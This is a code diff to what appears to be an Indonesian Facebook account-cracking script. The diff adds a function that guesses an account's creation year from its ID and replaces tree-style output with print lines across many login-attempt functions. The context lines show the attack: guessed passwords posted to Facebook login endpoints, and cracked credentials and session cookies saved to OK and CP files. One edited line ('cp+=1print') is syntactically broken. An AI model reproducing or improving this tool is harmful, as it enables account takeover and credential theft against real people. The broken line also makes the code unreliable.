@@ -1465,7 +1465,37 @@ def passwrd():
 	print(f'\33[1;96m  Crack Telah Selesai,Semoga Anda Bersyukur Dengan Hasil Nya')
 	print(f'{x}  [{h}•{x}]{h} OK : {h}%s '%(ok))
 	print(f'{x}  [{h}•{x}]{k} CP : {k}%s{x} '%(cp))
-
+	
+def cektahun(fx):
+	if len(fx)==15:
+		if fx[:10] in ['1000000000']       :tahunz = '2009'
+		elif fx[:9] in ['100000000']       :tahunz = '2009'
+		elif fx[:8] in ['10000000']        :tahunz = '2009'
+		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
+		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
+		elif fx[:6] in ['100001']          :tahunz = '2010'
+		elif fx[:6] in ['100002','100003'] :tahunz = '2011'
+		elif fx[:6] in ['100004']          :tahunz = '2012'
+		elif fx[:6] in ['100005','100006'] :tahunz = '2013'
+		elif fx[:6] in ['100007','100008'] :tahunz = '2014'
+		elif fx[:6] in ['100009']          :tahunz = '2015'
+		elif fx[:5] in ['10001']           :tahunz = '2016'
+		elif fx[:5] in ['10002']           :tahunz = '2017'
+		elif fx[:5] in ['10003']           :tahunz = '2018'
+		elif fx[:5] in ['10004']           :tahunz = '2019'
+		elif fx[:5] in ['10005']           :tahunz = '2020'
+		elif fx[:5] in ['10006']           :tahunz = '2021'
+		elif fx[:5] in ['10009']           :tahunz = '2023'
+		elif fx[:5] in ['10007','10008']:tahunz = '2022'
+		else:tahunz=''
+	elif len(fx) in [9,10]:
+		tahunz = '2008'
+	elif len(fx)==8:
+		tahunz = '2007'
+	elif len(fx)==7:
+		tahunz = '2006'
+	else:tahunz=''
+	return tahunz
 #--------------------[ METODE VALIDATE ]-----------------#
 def validate1(idf,pwv):
 	global loop,ok,cp
@@ -1559,19 +1589,13 @@ def validate2(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -1581,20 +1605,14 @@ def validate2(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -1628,19 +1646,14 @@ def validate3(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
 					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -1649,21 +1662,14 @@ def validate3(idf,pwv):
 				if 'no' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
-					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -1717,19 +1723,13 @@ def reguler1(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -1739,20 +1739,14 @@ def reguler1(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -1805,19 +1799,13 @@ def reguler2(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -1827,20 +1815,14 @@ def reguler2(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -1893,19 +1875,13 @@ def reguler3(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -1915,20 +1891,14 @@ def reguler3(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -1982,19 +1952,13 @@ def kontol(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -2004,20 +1968,14 @@ def kontol(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -2067,20 +2025,13 @@ def bapi(idf,pwv):
 			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
-					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					cp+=1print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}') 
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -2090,20 +2041,14 @@ def bapi(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break
@@ -2138,19 +2083,13 @@ def colmek1(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -2160,20 +2099,14 @@ def colmek1(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
@@ -2208,19 +2141,13 @@ def colmek2(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
 				elif 'ya' in gabriel:
 					cp+=1
-					tree = Tree(f" ")
-					tree.add(f"[bold yellow]{idf}|{pw}")
-					tree.add(f"[bold yellow]{ua}")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					ceker(idf,pw)
@@ -2230,20 +2157,14 @@ def colmek2(idf,pwv):
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					break
 				elif 'ya' in taplikasi:
 					ok+=1
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					tree = Tree(f"  ")
-					tree.add(f"[bold green]{idf}|{pw}")
-					tree.add(f"[bold green]{kuki}\n")
-					cetak(tree) 
+					print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
 					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 					cek_apk(kuki)
 					break		
